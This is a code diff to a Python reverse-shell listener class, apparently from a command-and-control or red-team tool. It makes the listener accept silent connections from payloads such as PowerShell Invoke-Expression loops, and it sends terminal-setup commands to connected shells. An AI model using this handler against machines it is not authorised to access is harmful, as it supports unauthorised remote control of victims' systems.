@@ -193,47 +193,32 @@ class ShellListener:
         shell_id = None
         try:
             with self.app.app_context():
-                # Accept any connection that exchanges data.
+                # Accept any connection that arrives on the listener port.
                 # This supports all shell types: Linux bash/sh, Windows
                 # cmd/PowerShell, macOS zsh, Python/PHP/Ruby/Java shells,
-                # netcat, and any other reverse shell payload.
+                # netcat, Invoke-Expression loops, and any other reverse
+                # shell payload.  We no longer reject silent connections
+                # because many Windows payloads (e.g. PowerShell
+                # Invoke-Expression loops) never send a banner and only
+                # respond once a command is submitted.
 
-                is_valid_shell = False
-
-                # Step 1: Check if the shell already sent a banner/prompt
-                # (e.g. Windows cmd banner, PowerShell prompt, motd, etc.)
+                initial_banner = b""
                 try:
                     conn.settimeout(3)
-                    banner = conn.recv(4096)
-                    if banner and len(banner) > 0:
-                        is_valid_shell = True
+                    initial_banner = conn.recv(4096)
                 except (socket.timeout, OSError):
                     pass
 
-                # Step 2: If no banner, send probes and wait for any reply.
-                if not is_valid_shell:
-                    probes = [
-                        b'echo SHELL_OK\r\n',     # Windows cmd/PowerShell + Unix
-                        b'echo SHELL_OK\n',        # Unix only fallback
-                    ]
-                    for probe in probes:
-                        try:
-                            conn.sendall(probe)
-                            time.sleep(2)  # Give slower shells time to respond
-                            conn.settimeout(5)
-                            response = conn.recv(4096)
-                            if response and len(response) > 0:
-                                is_valid_shell = True
-                                break
-                        except socket.timeout:
-                            continue
-                        except OSError:
-                            continue
-
-                if not is_valid_shell:
-                    conn.close()
-                    print(f"[!] Rejected non-shell connection from {ip}:{port} (no response to probe)")
-                    return
+                # Optionally probe for echo — purely informational, never
+                # used to reject.
+                if not initial_banner:
+                    try:
+                        conn.sendall(b'echo SHELL_OK\r\n')
+                        time.sleep(2)
+                        conn.settimeout(5)
+                        initial_banner = conn.recv(4096)
+                    except (socket.timeout, OSError):
+                        pass
                 
                 # Try to get system info
                 try:
@@ -371,6 +356,18 @@ class ShellListener:
                                     if not d:
                                         break
                             except (socket.timeout, OSError):
+                                pass
+                            # Set a generous terminal size so full-screen
+                            # programs (top, htop, vim) render properly.
+                            try:
+                                conn.sendall(b'stty rows 50 cols 200 2>/dev/null; export TERM=xterm-256color\n')
+                                time.sleep(0.3)
+                                conn.settimeout(1)
+                                try:
+                                    conn.recv(4096)
+                                except (socket.timeout, OSError):
+                                    pass
+                            except OSError:
                                 pass
                         except Exception:
                             pass
